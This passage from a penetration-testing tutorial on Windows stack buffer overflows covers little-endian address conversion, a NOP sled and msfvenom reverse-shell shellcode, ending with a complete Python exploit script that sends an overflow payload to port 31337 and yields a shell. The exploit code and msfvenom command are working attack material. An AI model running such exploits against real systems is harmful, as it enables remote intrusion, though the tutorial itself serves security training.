<p class="ai-optimize-138"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-niBAvqiCnuI/YJMCi2ZaMQI/AAAAAAAAv5I/LK40aBqn96YnVntqLLkEzwMTBFc2H1yXACLcBGAsYHQ/s16000/28.jpg"/></span></p>
<p class="ai-optimize-139"><span style="color: #000000;">As we can see in the above image that we have found the JMP ESP address to be <strong>080414C3</strong>. Before we update our script we need to understand the concept of Endianness.</span></p>
<h4 class="ai-optimize-140"><span style="color: #000000;">Endianness</span></h4>
<p class="ai-optimize-141"><span style="color: #000000;">There are two ways by which a computer stores multibyte data types like int and float. These two types are defined as Little Endian and Big Endian. People recognize x86 as Little Endian architecture. In this architecture, the system stores the last byte of the binary first. While in Big Endian, the exact opposite occurs. The system stores the first byte of the binary first only in Big Endian architecture. As we are working with x86 architecture, we should convert the JMP ESP address into Little Endian format, which will be “<strong>\xC3\x14\x04\x08</strong>”. After JMP ESP we need to put in some nops in our exploit.</span></p>
<h4 class="ai-optimize-142"><span style="color: #000000;">NOP-sled</span></h4>
<p class="ai-optimize-143"><span style="color: #000000;">A NOP-sled is a sequence of no-operation instructions which is responsible for sliding the CPU’s execution flow to the next memory address. If we have prepended nops before our shellcode then it doesn’t matter where the buffer is located. When the return pointer hits the NOP-sled then as the name suggests it is going to slide the return address until it reaches the beginning of our shellcode.</span></p>
<p class="ai-optimize-144"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I1NBqx7G_Dc/YJMCm2_uJEI/AAAAAAAAv5Q/8Sq7rZmNenkA-0Gdc8coWgm8A--BB_SuwCLcBGAsYHQ/s16000/29.png"/></span></p>
<p class="ai-optimize-145"><span style="color: #000000;">NOP values are different for <a style="color: #000000;" href="https://en.wikipedia.org/wiki/NOP_(code)"><span style="color: #0000ff;"><strong>different CPUs</strong></span></a>. In our case, we will be using “\x90”.</span></p>
<h4 class="ai-optimize-146"><span style="color: #000000;">Generating Shellcode</span></h4>
<p class="ai-optimize-147"><span style="color: #000000;">Our next step is to generate a bad character-free shellcode which we will later put in our exploit to achieve a reverse shell. For this, we will be using msfvenom. We are using a stageless payload “windows/shell_reverse_tcp”. Stageless payloads send the entire payload at once and don’t require the attacker to provide more data. The “EXITFUNC” option in our command states whether we want to close the whole process or just the relevant thread at the exit. </span></p>
<p class="ai-optimize-147"><span style="color: #000000;">This is useful in buffer overflow attacks as we do not want the application to crash after we have exploited it. We select the “-b” option to mention the characters we found to be bad characters and do not want to be present in our shellcode. We use the “-f” option to specify the output format of our shellcode, and many output formats are present in MSF to choose from. In our case, we have selected “py” which stands for python.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.106 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py</pre>
<p class="ai-optimize-148"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NZG74AcJaWY/YJMCsg9IMmI/AAAAAAAAv5Y/ihWrUrJRMNsaRbn9FVg482p4gvq_J1OzwCLcBGAsYHQ/s16000/30.jpg"/></span></p>
<h4 class="ai-optimize-149"><span style="color: #000000;">Final Exploit</span></h4>
<p class="ai-optimize-150"><span style="color: #000000;">Now that we have generated our shellcode as well. It’s time that we make all the necessary changes in our exploit and make it ready to gain a reverse shell. We don’t need all characters now. We will insert our generated shellcode in place of “allchars”. So, the basic architecture of our exploit will be <strong>146 A’s as junk value + JMP ESP + NOPs + Shellcode.</strong></span></p>
<p class="ai-optimize-151"><span style="color: #000000;">So our final exploit code should look like this:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">import socket

ip = "192.168.0.5"
port = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

offset = 146
#eip = "B" * 4
jmp_esp = "\xC3\x14\x04\x08"
nops = "\x90" * 16
buf =  b""
buf += b"\xdb\xdd\xba\xf4\x6f\xa1\x59\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x32\x6b\x43"
buf += b"\xac\x46\x9c\x01\x4f\xb6\x5d\x66\xd9\x53\x6c\xa6\xbd"
buf += b"\x10\xdf\x16\xb5\x74\xec\xdd\x9b\x6c\x67\x93\x33\x83"
buf += b"\xc0\x1e\x62\xaa\xd1\x33\x56\xad\x51\x4e\x8b\x0d\x6b"
buf += b"\x81\xde\x4c\xac\xfc\x13\x1c\x65\x8a\x86\xb0\x02\xc6"
buf += b"\x1a\x3b\x58\xc6\x1a\xd8\x29\xe9\x0b\x4f\x21\xb0\x8b"
buf += b"\x6e\xe6\xc8\x85\x68\xeb\xf5\x5c\x03\xdf\x82\x5e\xc5"
buf += b"\x11\x6a\xcc\x28\x9e\x99\x0c\x6d\x19\x42\x7b\x87\x59"
buf += b"\xff\x7c\x5c\x23\xdb\x09\x46\x83\xa8\xaa\xa2\x35\x7c"
buf += b"\x2c\x21\x39\xc9\x3a\x6d\x5e\xcc\xef\x06\x5a\x45\x0e"
buf += b"\xc8\xea\x1d\x35\xcc\xb7\xc6\x54\x55\x12\xa8\x69\x85"
buf += b"\xfd\x15\xcc\xce\x10\x41\x7d\x8d\x7c\xa6\x4c\x2d\x7d"
buf += b"\xa0\xc7\x5e\x4f\x6f\x7c\xc8\xe3\xf8\x5a\x0f\x03\xd3"
buf += b"\x1b\x9f\xfa\xdc\x5b\xb6\x38\x88\x0b\xa0\xe9\xb1\xc7"
buf += b"\x30\x15\x64\x47\x60\xb9\xd7\x28\xd0\x79\x88\xc0\x3a"
buf += b"\x76\xf7\xf1\x45\x5c\x90\x98\xbc\x37\x5f\xf4\xbe\xad"
buf += b"\x37\x07\xbe\x20\x94\x8e\x58\x28\x34\xc7\xf3\xc5\xad"
buf += b"\x42\x8f\x74\x31\x59\xea\xb7\xb9\x6e\x0b\x79\x4a\x1a"
buf += b"\x1f\xee\xba\x51\x7d\xb9\xc5\x4f\xe9\x25\x57\x14\xe9"
buf += b"\x20\x44\x83\xbe\x65\xba\xda\x2a\x98\xe5\x74\x48\x61"
buf += b"\x73\xbe\xc8\xbe\x40\x41\xd1\x33\xfc\x65\xc1\x8d\xfd"
buf += b"\x21\xb5\x41\xa8\xff\x63\x24\x02\x4e\xdd\xfe\xf9\x18"
buf += b"\x89\x87\x31\x9b\xcf\x87\x1f\x6d\x2f\x39\xf6\x28\x50"
buf += b"\xf6\x9e\xbc\x29\xea\x3e\x42\xe0\xae\x5f\xa1\x20\xdb"
buf += b"\xf7\x7c\xa1\x66\x9a\x7e\x1c\xa4\xa3\xfc\x94\x55\x50"
buf += b"\x1c\xdd\x50\x1c\x9a\x0e\x29\x0d\x4f\x30\x9e\x2e\x5a"
shellcode = buf

buffer = "A" * offset + jmp_esp + nops + shellcode
buffer += "\n"
s.send(buffer)
</pre>
<h4 class="ai-optimize-152"><span style="color: #000000;">Reverse Shell</span></h4>
<p class="ai-optimize-153"><span style="color: #000000;">Since we have already performed all the necessary steps to get a reverse shell. Now we can just start the Netcat listener on port 4444 and run the exploit. As we can see in the image, we successfully exploited the buffer overflow vulnerability present in the application and gained a reverse shell.</span></p>
<p class="ai-optimize-154"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8XYpUDkrT8o/YJMCyKUTm4I/AAAAAAAAv5g/VJdbBR6lcng3MBa20ZrU-5yrGx9xl1JMwCLcBGAsYHQ/s16000/31.jpg"/></span></p>
<h3 class="ai-optimize-155"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-156"><span style="color: #000000;">This concludes the basic concepts of stack-based Windows buffer overflow and buffer overflow attacks. In our future articles, we will explore how an attacker performs a buffer overflow attack in Linux. We will also understand how we can perform a buffer overflow attack if a security feature like ASLR is on. So, stay tuned!</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Penetration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
<p class="ai-optimize-157"><span style="color: #000000;"><strong>Author: </strong></span><span style="color: #000000;">Benoy Naskar is an Offensive Security Certified Professional, Researcher, and Penetration Tester. Contact through <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/benoy-naskar-590116152/">LinkedIn</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
